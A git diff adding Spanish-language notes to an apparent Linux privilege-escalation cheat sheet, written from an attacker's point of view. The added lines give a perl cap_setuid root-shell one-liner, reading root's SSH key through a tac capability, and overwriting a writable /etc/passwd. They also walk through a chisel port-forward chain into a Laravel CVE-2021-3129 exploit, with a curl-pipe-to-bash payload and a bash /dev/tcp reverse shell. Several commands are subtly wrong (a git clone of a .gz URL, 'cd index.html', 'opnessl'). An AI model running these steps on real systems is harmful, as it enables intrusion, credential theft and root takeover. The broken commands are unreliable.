@@ -190,24 +190,85 @@ groups <username> # Con este comando puedes ver los grupos a los cuales pertenec
 Ver las tareas que estan a punto de ejecutarse 
 <br>
 ## getcap -r / 2>/dev/null.
-Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla.
+Listar las capabilities a nivel de sistema de forma recursiva y los errores redirigirlos al stderr para no verlos en pantalla. Las capabilities nos permiten gestionar los permisos que tiene un proceso para accerder al kernel independientemente de quien lo ejecute. Lo que hacen las capabilities es dividir las llamadas de kernel priviligiadas en grupos mas pequeños de privilegios.<br>
+- /usr/bin/perl -> cap_setuid+ep.<br>+ep significa que la capability es efectiva y permitida.<br>
+Esta capability te permite controlar el identificador de usuario para convertirte en usuario root cambiando el uid. Para escalar privilegios lo primero que se hace es asignarle la capability cap_setuid+ep al binario perl y despues se ejecuta una instrucción que te arrogará una consola como root.
+
+
+```
+setcap cap_setuid+ep perl
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+- /usr/bin/tac -> cap_dac_read_search+ei.<br>Esta capability se puede asignar a un binario, en este caso esta asignada al binario tac el cual es un como un cat solo que invierte el output. Con el binario tac puedes ver la id_rsa de un usuario que este dentro del sistema o bien del usuario root para conectarte de forma remota por el puerto 22 (SSH) si se encuentra abierto. Tambien con esta capability puedes salir de un contenedor para conectarte directo al sistema.
+
+
+```
+tac /root/.ssh/id_rsa | tac -> Se le concatena otro tac para regresar el output a la normalidad.
+```
 <br>
 ## ps -faux | ps -e command.
 Listar los procesos que se estan ejecutando.
 <br>
 ## find / -writable -ls 2>/dev/null.
-Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso.
+Listar aquellos archivos que tengan capacidad de escritura para despues injectarles código malicioso. Puedes usar regex para ir filtrando los archivos.<br>
+```
+find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/proc|/sys|/tmp" 
+# Con grep -vE "" vas ir quitando las lineas que hagan match.
+```
+Si al ir filtrando vez que el /etc/passwd tiene capacidad de escritura puedes crear una contraseña DES(unix) con openssl para sustiturla en el /etc/passwd y se interprete primero ésta primero antes de la original, situada en el /etc/shadow.
+```
+opnessl passwd <EstaEsUnaContraseña> 
+password: <ContraseñaDeCifrado>
+# Posteriormente te pedira una contraseña para cifrar el texto que pusiste anteriormente y esa misma contraseña de cifrado 
+# seŕa la que te pida al hacer su root.
+
+su root
+password: <ContraseñaDeCifrado>
+```
+<br>
+## netstat -nat | ss-nltp.
+Comando para ver los puertos que se encuentran abiertos internamente en el equipo y aplicar un Port Forwarding.<br>El Port Forwarding es básicamente traerte un puerto que se este abierto internamente en la maquina víctima a tu equipo de atacante.<br>
+
+Si al aplicar el comando netstat -nat o ss-nltp logras ver el puerto 8000 abierto y en el esta corriendo laravel que por lo regular laravel corre en ese puerto por default a menos que se modifique, puedes llegar a escalar privilegios sino esta sanitizado.<br>
+- Lo primero tienes que hacer es clonar chisel de github y redudir el peso para que no tarde al transferirlo a la máquina víctima.<br>Te compartes un servicio http con python y transfieres el chisel en un directorio que tenga capacidad de escritura, le asignas permisos de ejecución y lo ejecutas.<br>Te clonas la CVE-2021-3129 de github, ingresas en el directorio creado y te ejecutas el exploit.py.<br>Desde otra ventana te creas un archivo que contenga una reverse shell y compartes un servicio http.<br>En otra ventana te pones en escucha con ncat para que al ejecutar el exploit.py de la CVE-2021-3129 esta hace un curl a tu servicio compartido y te envia una reverse shell al ncat por el puerto 443.
+
+
+```
+git clone https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_arm64.gz
+cd chisel && go build -ldflags "-s -w" . && upx chisel  # Reducir el peso del chisel.
+sudo python3 -m http.server 80
+
+cd /tmp
+wget http://<ip-address>/chisel				# Desde la máquina víctima.
+chmod +x chisel
+./chisel client <ip-address>:1234 R:8000:127.0.0.1:8000	
+# Esto hará que el puerto 8000 de la máquina víctima se transfiera a tu máquina como el puerto 8000 y puedeas acceder a el 
+# desde el localhost Ej; localhost:8000
+
+./chisel server reverse -p 1234				# Desde tu máquina de atacante.
+
+nano index.html && cd index.html
+# Le metes esta linea en el index.html -> bash -i >& /dev/tcp/<ip-address>/443 0>&1
+sudo python3 -m http.server 80
+
+sudo -rlwrap ncat -nlvp 443
+
+git clone CVE-2021-3129 
+cd CVE-2021-3129 && ./exploit.py http://localhost:8000 Monolog/RCE1 'curl <tu-ip-address> | bash'
+```
+Al ejecutarlo ganaras acceso al sistema como el usuario root.
 <br>
 ## linPEAS.sh.
+linPEAS es una herramienta que te automatiza la escalada de privilegios reportandote aquellas vías potenciales por las cuales puedes llegar a convertirte en usuario root.
+Te clonas el repositorio de github https://github.com/carlospolop/PEASS-ng/releases/tag/20220731 a tu equipo y te comprartes un servicio con python3 para transferir el linPEAS.sh a la máquina víctima.<br>Te transfieres el linPEAS, le das permisos de ejecución y lo ejecutas.<br>Busca por cosas relacionadas con nombres de bases de datos (mysql, mongo etc), passwords, keys, usernames, emails, información que sea delicada.
+```
+git clone https://github.com/carlospolop/PEASS-ng/releases/tag/20220731
+sudo python3 -m http.server 80
 
-
-
-
-
-
-
-
-
+wget http://<ip-address/linPEAS.sh			# Desde la máquina víctima
+chmod +x linPEAS.sh
+./linPEAS.sh
+```
 
 
 
